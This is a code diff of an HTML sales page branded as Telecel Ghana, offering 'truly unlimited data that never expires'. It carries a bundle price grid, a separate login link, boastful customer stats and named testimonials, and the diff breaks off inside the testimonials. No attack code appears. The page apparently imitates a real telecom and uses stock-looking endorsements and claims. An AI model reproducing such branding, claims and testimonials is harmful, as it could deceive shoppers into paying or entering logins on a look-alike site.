@@ -3,390 +3,346 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telecel Ghana - Non-Expiry Unlimited Data Bundles</title>
+    <title>Telecel Ghana - Data Bundles</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
     <style>
         :root {
             --red: #E30613;
             --blue: #0033A0;
-            --dark: #111111;
         }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Inter', sans-serif;
-            background: #f8f9fa;
-            color: #1e2937;
+            color: #333;
             line-height: 1.6;
+            background: #f8f9fa;
         }
-        /* NAV */
+
+        /* Sticky Navigation */
         nav {
-            background: white;
-            padding: 16px 5%;
+            background: linear-gradient(135deg, #E30613 0%, #0033A0 100%);
+            padding: 14px 5%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
             position: sticky;
             top: 0;
             z-index: 1000;
-            box-shadow: 0 2px 12px rgba(0,0,0,0.1);
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
-        .nav-content {
-            max-width: 1400px;
-            margin: 0 auto;
+        .nav-brand {
             display: flex;
             align-items: center;
-            gap: 16px;
+            gap: 12px;
+            color: white;
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 1.5rem;
         }
-        .telecel-logo {
-            width: 92px;
-            height: 92px;
-            flex-shrink: 0;
+        .telecel-logo { 
+            width: 70px; 
+            height: 70px; 
+            filter: brightness(0) invert(1); /* Makes logo white */
         }
-        .nav-title {
-            font-size: 1.85rem;
-            font-weight: 800;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            white-space: nowrap;
-        }
-        .nav-title .telecel-red { color: var(--red); }
-        .nav-title .databundles-blue { color: var(--blue); }
 
-        /* HERO */
+        .login-btn {
+            background: white;
+            color: #E30613;
+            padding: 10px 26px;
+            border-radius: 50px;
+            font-weight: 700;
+            text-decoration: none;
+        }
+
+        /* Hero */
         .hero {
             background: linear-gradient(135deg, #E30613, #9F1239);
             color: white;
             padding: 90px 5% 70px;
             text-align: center;
         }
-        .hero .telecel-logo { width: 148px; height: 148px; margin-bottom: 25px; }
         .hero h1 {
-            font-size: 2.9rem;
+            font-size: 2.6rem;
             font-weight: 800;
-            margin-bottom: 18px;
+            line-height: 1.1;
         }
         .hero p {
             font-size: 1.3rem;
-            max-width: 760px;
-            margin: 0 auto 35px;
+            max-width: 720px;
+            margin: 20px auto 35px;
+        }
+        .hero-btn {
+            background: white;
+            color: #E30613;
+            padding: 16px 55px;
+            border: none;
+            border-radius: 50px;
+            font-size: 1.25rem;
+            font-weight: 700;
+            cursor: pointer;
         }
 
-        /* PLANS */
-        .plans-section {
-            padding: 90px 5%;
+        /* Stats */
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+            gap: 1.5rem;
+            padding: 3rem 5%;
+            background: #f8f9fc;
+            text-align: center;
+        }
+
+        /* Bundles */
+        .bundles-section {
+            padding: 80px 5%;
+            max-width: 1400px;
+            margin: 0 auto;
         }
         .section-title {
             text-align: center;
-            font-size: 2.7rem;
+            font-size: 2.5rem;
             font-weight: 800;
-            margin-bottom: 65px;
+            color: var(--blue);
+            margin-bottom: 50px;
         }
-        .tier-grid {
+        .bundles-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(360px, 1fr));
-            gap: 30px;
-            max-width: 1600px;
-            margin: 0 auto;
+            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+            gap: 24px;
         }
-        .tier-card {
-            background: #1a1a1a;
-            color: white;
-            border-radius: 24px;
-            padding: 36px 28px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.25);
-            height: 100%;
-            display: flex;
-            flex-direction: column;
-        }
-        .tier-card h3 {
+        .bundle-card {
+            background: white;
+            border: 2px solid #E30613;
+            border-radius: 20px;
+            padding: 28px 20px;
             text-align: center;
-            font-size: 1.9rem;
-            font-weight: 800;
-            margin-bottom: 24px;
+            transition: all 0.3s;
         }
-        .offer {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 16px 20px;
-            margin: 10px 0;
-            background: #2a2a2a;
-            border-radius: 14px;
-            font-size: 1.1rem;
+        .bundle-card:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 15px 30px rgba(227,6,19,0.18);
         }
-        .price-tag {
-            font-size: 1.6rem;
-            font-weight: 800;
-            color: var(--red);
-        }
-        .get-offer-btn {
-            background: var(--red);
+        .bundle-data { font-size: 1.75rem; font-weight: 700; color: var(--blue); }
+        .bundle-price { font-size: 2.3rem; font-weight: 800; color: var(--red); margin: 12px 0 18px; }
+        .bundle-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #E30613, #0033A0);
             color: white;
             border: none;
-            padding: 12px 24px;
             border-radius: 50px;
             font-weight: 700;
             cursor: pointer;
-            font-size: 1rem;
-            margin-top: 8px;
-        }
-        .popular-badge {
-            background: var(--red);
-            color: white;
-            font-size: 0.9rem;
-            padding: 5px 14px;
-            border-radius: 999px;
-            margin-left: 10px;
         }
 
-        /* Testimonials & FAQ */
-        .testimonials, .faq {
-            padding: 90px 5%;
+        /* Testimonials */
+        .testimonials-section {
+            padding: 80px 5%;
+            background: #f8f9fc;
         }
         .testimonial-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 28px;
+            grid-template-columns: repeat(auto-fit, minmax(290px, 1fr));
+            gap: 22px;
         }
         .testimonial-card {
-            background: #f8f9fa;
-            padding: 32px;
-            border-radius: 20px;
+            background: white;
+            padding: 26px;
+            border-radius: 16px;
             box-shadow: 0 8px 25px rgba(0,0,0,0.08);
+        }
+
+        /* FAQ */
+        .faq-section {
+            padding: 80px 5%;
         }
         .faq-item {
             background: white;
-            margin-bottom: 16px;
-            border-radius: 16px;
-            box-shadow: 0 5px 20px rgba(0,0,0,0.06);
+            margin-bottom: 14px;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.07);
         }
         .faq-question {
-            padding: 24px;
+            padding: 20px;
+            width: 100%;
+            text-align: left;
+            border: none;
             font-weight: 600;
             cursor: pointer;
             display: flex;
             justify-content: space-between;
-            align-items: center;
-            background: #f8f9fa;
-        }
-        .faq-answer {
-            padding: 0 24px 24px;
-            display: none;
-            color: #444;
         }
 
-        /* FOOTER */
         footer {
             background: #111111;
             color: #ccc;
-            padding: 80px 5% 40px;
+            padding: 60px 5% 40px;
+            text-align: center;
         }
-        .footer-grid {
-            max-width: 1300px;
-            margin: 0 auto;
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
-            gap: 50px;
-        }
-        .footer-grid h4 { color: white; margin-bottom: 18px; }
 
-        /* MOBILE */
         @media (max-width: 768px) {
-            .tier-grid { grid-template-columns: 1fr; }
-            .hero h1 { font-size: 2.3rem; }
-        }
-        @media (max-width: 480px) {
-            .nav-title { font-size: 1.4rem; gap: 6px; }
-            .hero .telecel-logo { width: 115px; height: 115px; }
+            .hero h1 { font-size: 2.1rem; }
+            .bundles-grid { grid-template-columns: repeat(2, 1fr); }
         }
     </style>
 </head>
 <body>
-    <!-- NAV -->
+
+    <!-- Navigation -->
     <nav>
-        <div class="nav-content">
-            <div class="telecel-logo">
-                <svg width="96" height="96" viewBox="0 0 96 96" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M48.19 28.6833C40.4333 28.605 34.1983 34.9933 34.2183 42.58C34.2383 50.625 40.9883 56.56 48.0333 56.4317C55.5033 56.5017 61.8867 50.53 61.9517 42.7583C62.02 34.62 55.575 28.76 48.19 28.6833ZM53.7333 38.1633C53.6017 39.2783 52.9467 39.9367 51.93 40.29C51.3683 40.4867 50.7833 40.4917 50.195 40.4917C49.8333 40.49 49.4683 40.46 49.1067 40.5183C48.8467 40.5617 48.7033 40.6917 48.6667 40.97C48.6133 41.3467 48.6917 41.7133 48.6883 42.085C48.6867 43.6083 48.6883 45.135 48.6867 46.6583C48.6867 46.9117 48.7133 47.1617 48.7667 47.4067C48.9833 48.3783 49.7917 48.955 50.7817 48.8333C51.5417 48.7383 52.31 48.7333 53.0733 48.6683C53.3933 48.6417 53.495 48.7833 53.4717 49.1233C53.435 49.6333 53.4383 50.1433 53.47 50.655C53.535 51.715 53.0383 52.4717 52.1333 52.8467C49.6867 53.8583 47.2717 53.835 45.065 52.2417C43.8517 51.3667 43.2033 50.115 43.1333 48.57C43.0467 46.585 43.0117 44.6 42.9517 42.6117C42.8883 40.605 42.9083 38.5967 42.9233 36.59C42.9333 35.2433 43.5583 34.15 44.5517 33.265C45.1033 32.7717 45.7183 32.37 46.3867 32.05C46.9933 31.7583 47.6283 31.6483 48.295 31.6583C48.5333 31.6633 48.6233 31.7533 48.6467 31.9983C48.7117 32.6333 48.68 33.27 48.6933 33.8517C48.6933 34.3667 48.6883 34.8317 48.6933 35.295C48.695 35.6983 48.8383 35.845 49.2467 35.905C49.5283 35.9483 49.8083 35.9117 50.09 35.91C51.06 35.8983 52.0267 35.8983 52.9967 35.905C53.5683 35.9117 53.745 36.0867 53.7283 36.6517C53.7117 37.1567 53.7967 37.655 53.7383 38.1633H53.7333Z" fill="#E32526"></path>
-                    <path d="M48.665 40.9682C48.6117 41.3448 48.69 41.7115 48.6867 42.0832C48.685 43.6065 48.6867 45.1332 48.685 46.6565C48.685 46.9098 48.7117 47.1598 48.765 47.4048C48.9817 48.3765 49.79 48.9532 50.78 48.8315C51.54 48.7365 52.3083 48.7315 53.0717 48.6665C53.3917 48.6398 53.4933 48.7815 53.47 49.1215C53.4333 49.6315 53.4367 50.1415 53.4683 50.6532C53.5333 51.7132 53.0367 52.4698 52.1317 52.8448C49.685 53.8565 47.27 53.8332 45.0633 52.2398C43.85 51.3648 43.2017 50.1132 43.1317 48.5682C43.045 46.5832 43.01 44.5982 42.95 42.6098C42.8867 40.6032 42.9067 38.5948 42.9217 36.5882C42.9317 35.2415 43.5567 34.1482 44.55 33.2632C45.1017 32.7698 45.7167 32.3682 46.385 32.0482C46.9917 31.7565 47.6267 31.6465 48.2933 31.6565C48.5317 31.6615 48.6217 31.7515 48.645 31.9965C48.71 32.6315 48.6783 33.2682 48.6917 33.8498C48.6917 34.3648 48.6867 34.8298 48.6917 35.2932C48.6933 35.6965 48.8367 35.8432 49.245 35.9032C49.5267 35.9465 49.8067 35.9098 50.0883 35.9082C51.0583 35.8965 52.025 35.8965 52.995 35.9032C53.5667 35.9098 53.7433 36.0848 53.7267 36.6498C53.71 37.1548 53.795 37.6532 53.7367 38.1615C53.605 39.2765 52.95 39.9348 51.9333 40.2882C51.3717 40.4848 50.7867 40.4898 50.1983 40.4898C49.8367 40.4882 49.4717 40.4582 49.11 40.5165C48.85 40.5598 48.7067 40.6898 48.67 40.9682H48.665Z" fill="white"></path>
-                </svg>
-            </div>
-            <div class="nav-title">
-                <span class="telecel-red">Telecel</span>
-                <span class="databundles-blue">Data Bundles</span>
-            </div>
-        </div>
+        <a href="#" class="nav-brand">
+            <img src="data:image/png;base64,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" 
+                 class="telecel-logo" alt="Telecel">
+            <span>Telecel <span class="blue">Data Bundles</span></span>
+        </a>
+        <a href="login.html" class="login-btn">Login</a>
     </nav>
 
-    <!-- HERO -->
+    <!-- Hero -->
     <section class="hero">
-        <div class="telecel-logo">
-            <svg width="148" height="148" viewBox="0 0 96 96" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <!-- SVG content same as above -->
-            </svg>
-        </div>
         <h1>Truly Unlimited Data That Never Expires</h1>
-        <p>Available only for Telecel Regular Users • Instant Activation • Best Value in Ghana</p>
-        <button onclick="document.getElementById('plans').scrollIntoView({ behavior: 'smooth' })"
-                style="background:white;color:#E30613;padding:18px 60px;border-radius:50px;font-weight:700;font-size:1.25rem;border:none;cursor:pointer;">
-            Unlock All Plans Now →
+        <p>Instant Activation • Best Value in Ghana • Available for All Telecel Users</p>
+        <button class="hero-btn" onclick="document.getElementById('bundles').scrollIntoView({ behavior: 'smooth' })">
+            Buy Data Now →
         </button>
     </section>
 
-    <!-- PLANS -->
-    <section class="plans-section" id="plans">
-        <h2 class="section-title">Non-Expiry Unlimited Data Bundles</h2>
-        <div class="tier-grid">
+    <!-- Stats -->
+    <section class="stats">
+        <div class="stat-item"><h3>5M+</h3><p>Happy Customers</p></div>
+        <div class="stat-item"><h3>99.8%</h3><p>Network Uptime</p></div>
+        <div class="stat-item"><h3>Instant</h3><p>Activation</p></div>
+        <div class="stat-item"><h3>24/7</h3><p>Support</p></div>
+    </section>
 
-            <!-- STARTER -->
-            <div class="tier-card">
-                <h3>STARTER</h3>
-                <div class="offer"><div><strong>10GB</strong></div><div class="price-tag">GHS 15</div><button class="get-offer-btn" onclick="buyOffer('Starter','10GB',15)">Get Offer</button></div>
-                <div class="offer"><div><strong>25GB</strong></div><div class="price-tag">GHS 28</div><button class="get-offer-btn" onclick="buyOffer('Starter','25GB',28)">Get Offer</button></div>
-                <div class="offer"><div><strong>50GB</strong></div><div class="price-tag">GHS 45</div><button class="get-offer-btn" onclick="buyOffer('Starter','50GB',45)">Get Offer</button></div>
-                <div class="offer"><div><strong>100GB</strong></div><div class="price-tag">GHS 75</div><button class="get-offer-btn" onclick="buyOffer('Starter','100GB',75)">Get Offer</button></div>
+    <!-- Bundles -->
+    <section class="bundles-section" id="bundles">
+        <h2 class="section-title">Choose Your Perfect Bundle</h2>
+        <div class="bundles-grid">
+            <div class="bundle-card">
+                <div class="bundle-data">10 GB</div>
+                <div class="bundle-price">GHS 15</div>
+                <button class="bundle-btn" onclick="buyOffer('10GB Daily', 15)">Buy Now</button>
+            </div>
+            <div class="bundle-card">
+                <div class="bundle-data">25 GB</div>
+                <div class="bundle-price">GHS 28</div>
+                <button class="bundle-btn" onclick="buyOffer('25GB Weekly', 28)">Buy Now</button>
+            </div>
+            <div class="bundle-card">
+                <div class="bundle-data">50 GB</div>
+                <div class="bundle-price">GHS 45</div>
+                <button class="bundle-btn" onclick="buyOffer('50GB Monthly', 45)">Buy Now</button>
+            </div>
+            <div class="bundle-card">
+                <div class="bundle-data">100 GB</div>
+                <div class="bundle-price">GHS 80</div>
+                <button class="bundle-btn" onclick="buyOffer('100GB Monthly', 80)">Buy Now</button>
             </div>
 
-            <!-- BRONZE -->
-            <div class="tier-card">
-                <h3>BRONZE</h3>
-                <div class="offer"><div><strong>150GB</strong></div><div class="price-tag">GHS 105</div><button class="get-offer-btn" onclick="buyOffer('Bronze','150GB',105)">Get Offer</button></div>
-                <div class="offer"><div><strong>250GB</strong></div><div class="price-tag">GHS 165</div><button class="get-offer-btn" onclick="buyOffer('Bronze','250GB',165)">Get Offer</button></div>
-                <div class="offer"><div><strong>400GB</strong></div><div class="price-tag">GHS 245</div><button class="get-offer-btn" onclick="buyOffer('Bronze','400GB',245)">Get Offer</button></div>
-                <div class="offer"><div><strong>600GB</strong></div><div class="price-tag">GHS 320</div><button class="get-offer-btn" onclick="buyOffer('Bronze','600GB',320)">Get Offer</button></div>
+            <div class="bundle-card">
+                <div class="bundle-data">150 GB</div>
+                <div class="bundle-price">GHS 110</div>
+                <button class="bundle-btn" onclick="buyOffer('150GB Monthly', 110)">Buy Now</button>
+            </div>
+            <div class="bundle-card">
+                <div class="bundle-data">250 GB</div>
+                <div class="bundle-price">GHS 160</div>
+                <button class="bundle-btn" onclick="buyOffer('250GB Monthly', 160)">Buy Now</button>
+            </div>
+            <div class="bundle-card">
+                <div class="bundle-data">400 GB</div>
+                <div class="bundle-price">GHS 220</div>
+                <button class="bundle-btn" onclick="buyOffer('400GB Monthly', 220)">Buy Now</button>
+            </div>
+            <div class="bundle-card">
+                <div class="bundle-data">600 GB</div>
+                <div class="bundle-price">GHS 290</div>
+                <button class="bundle-btn" onclick="buyOffer('600GB Monthly', 290)">Buy Now</button>
             </div>
 
-            <!-- SILVER -->
-            <div class="tier-card">
-                <h3>SILVER</h3>
-                <div class="offer"><div><strong>800GB</strong></div><div class="price-tag">GHS 420</div><button class="get-offer-btn" onclick="buyOffer('Silver','800GB',420)">Get Offer</button></div>
-                <div class="offer"><div><strong>1.2TB</strong></div><div class="price-tag">GHS 580</div><button class="get-offer-btn" onclick="buyOffer('Silver','1.2TB',580)">Get Offer</button></div>
-                <div class="offer"><div><strong>1.8TB</strong></div><div class="price-tag">GHS 780</div><button class="get-offer-btn" onclick="buyOffer('Silver','1.8TB',780)">Get Offer</button></div>
-                <div class="offer"><div><strong>2.5TB</strong></div><div class="price-tag">GHS 980</div><button class="get-offer-btn" onclick="buyOffer('Silver','2.5TB',980)">Get Offer</button></div>
+            <div class="bundle-card">
+                <div class="bundle-data">1 TB</div>
+                <div class="bundle-price">GHS 380</div>
+                <button class="bundle-btn" onclick="buyOffer('1TB Premium', 380)">Buy Now</button>
             </div>
-
-            <!-- GOLD -->
-            <div class="tier-card">
-                <h3>GOLD <span class="popular-badge">POPULAR</span></h3>
-                <div class="offer"><div><strong>3TB</strong></div><div class="price-tag">GHS 1250</div><button class="get-offer-btn" onclick="buyOffer('Gold','3TB',1250)">Get Offer</button></div>
-                <div class="offer"><div><strong>5TB</strong></div><div class="price-tag">GHS 1750</div><button class="get-offer-btn" onclick="buyOffer('Gold','5TB',1750)">Get Offer</button></div>
-                <div class="offer"><div><strong>8TB</strong></div><div class="price-tag">GHS 2450</div><button class="get-offer-btn" onclick="buyOffer('Gold','8TB',2450)">Get Offer</button></div>
-                <div class="offer"><div><strong>12TB</strong></div><div class="price-tag">GHS 3200</div><button class="get-offer-btn" onclick="buyOffer('Gold','12TB',3200)">Get Offer</button></div>
+            <div class="bundle-card">
+                <div class="bundle-data">Unlimited Lite</div>
+                <div class="bundle-price">GHS 950</div>
+                <button class="bundle-btn" onclick="buyOffer('Unlimited Lite', 950)">Buy Now</button>
             </div>
-
-            <!-- PLATINUM -->
-            <div class="tier-card">
-                <h3>PLATINUM</h3>
-                <div class="offer"><div><strong>15TB</strong></div><div class="price-tag">GHS 4200</div><button class="get-offer-btn" onclick="buyOffer('Platinum','15TB',4200)">Get Offer</button></div>
-                <div class="offer"><div><strong>Unlimited Lite</strong></div><div class="price-tag">GHS 5800</div><button class="get-offer-btn" onclick="buyOffer('Platinum','Unlimited Lite',5800)">Get Offer</button></div>
-                <div class="offer"><div><strong>Unlimited</strong></div><div class="price-tag">GHS 7500</div><button class="get-offer-btn" onclick="buyOffer('Platinum','Unlimited',7500)">Get Offer</button></div>
-                <div class="offer"><div><strong>Unlimited Ultra</strong></div><div class="price-tag">GHS 9500</div><button class="get-offer-btn" onclick="buyOffer('Platinum','Unlimited Ultra',9500)">Get Offer</button></div>
+            <div class="bundle-card">
+                <div class="bundle-data">Unlimited</div>
+                <div class="bundle-price">GHS 1,250</div>
+                <button class="bundle-btn" onclick="buyOffer('Unlimited Monthly', 1250)">Buy Now</button>
             </div>
-
-            <!-- DIAMOND -->
-            <div class="tier-card">
-                <h3>DIAMOND</h3>
-                <div class="offer"><div><strong>Unlimited Priority</strong></div><div class="price-tag">GHS 12000</div><button class="get-offer-btn" onclick="buyOffer('Diamond','Unlimited Priority',12000)">Get Offer</button></div>
-                <div class="offer"><div><strong>Family Unlimited</strong></div><div class="price-tag">GHS 16500</div><button class="get-offer-btn" onclick="buyOffer('Diamond','Family Unlimited',16500)">Get Offer</button></div>
-                <div class="offer"><div><strong>Enterprise Unlimited</strong></div><div class="price-tag">GHS 22000</div><button class="get-offer-btn" onclick="buyOffer('Diamond','Enterprise Unlimited',22000)">Get Offer</button></div>
-                <div class="offer"><div><strong>Corporate VIP</strong></div><div class="price-tag">GHS 35000</div><button class="get-offer-btn" onclick="buyOffer('Diamond','Corporate VIP',35000)">Get Offer</button></div>
+            <div class="bundle-card">
+                <div class="bundle-data">Unlimited Ultra</div>
+                <div class="bundle-price">GHS 2,200</div>
+                <button class="bundle-btn" onclick="buyOffer('Unlimited Ultra', 2200)">Buy Now</button>
             </div>
         </div>
     </section>
 
-    <!-- WHAT PEOPLE SAY (15) -->
-    <section class="testimonials">
+    <!-- Testimonials -->
+    <section class="testimonials-section">
         <h2 class="section-title">What People Say</h2>
         <div class="testimonial-grid">
-            <div class="testimonial-card"><strong>“Truly unlimited data that never expires. Best in Ghana!”</strong><br><br>— Ama Mensah, Accra</div>
-            <div class="testimonial-card"><strong>“I enjoy unlimited browsing without worrying about expiry.”</strong><br><br>— Kofi Boateng, Kumasi</div>
-            <div class="testimonial-card"><strong>“The Diamond plan gives me real unlimited data. Amazing!”</strong><br><br>— Abena Osei, Takoradi</div>
-            <div class="testimonial-card"><strong>“Fast activation and truly unlimited. Highly recommended.”</strong><br><br>— Kwame Asante, Tema</div>
-            <div class="testimonial-card"><strong>“No more data worries. Telecel unlimited is the real deal.”</strong><br><br>— Yaa Serwaa, Cape Coast</div>
